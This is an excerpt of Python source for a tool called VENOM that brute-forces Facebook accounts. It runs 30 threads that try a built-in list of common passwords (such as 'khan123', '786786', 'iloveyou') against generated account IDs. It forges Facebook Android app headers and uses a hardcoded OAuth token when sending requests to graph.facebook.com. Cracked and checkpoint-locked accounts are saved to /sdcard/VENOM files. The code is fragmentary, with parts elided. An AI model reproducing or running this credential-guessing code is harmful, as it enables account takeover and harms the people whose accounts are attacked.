...
def pak():
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as VENOM:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','57273200','khankhan','786786','khan123','khan12345','khan123456','786787','khanbaba','khan786','khankhan12345','malik123','malik12345','khanzada','kingkhan','khan1234','alikhan','pak123','ali123','ali12345','ali786','ali123456','jan jan','baloch','baloch123','khan1122','khan12','i love you','iloveyou','janjan']
...
def gmail():
                ...
                with tred(max_workers=30) as VENOM:
                        ...
                        for user in fo:
                                ...
                                VENOM.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
us = "[FBAN/FB4A;FBAV/126.0.0.21.77;FBBV/59748977;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/59748977;FB_FW/2;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G935A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
def rd1(ids,passlist):
    try:
        ...
        for pas in passlist:
                ...
                xxx = "[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2081};FBLC/en_US;FBRV/'+fbrv+';FBCR/Jio 4G;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1806;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;]"
                ...
                ua  = "[FBAN/FB4A;FBAV/270.1.0.66.127;FBBV/214895222;FBDM/{density=3.0,width=1080,height=2081};FBLC/en_US;FBRV/215203224;FBCR/Jio 4G;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1806;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
                head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'keep-alive','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
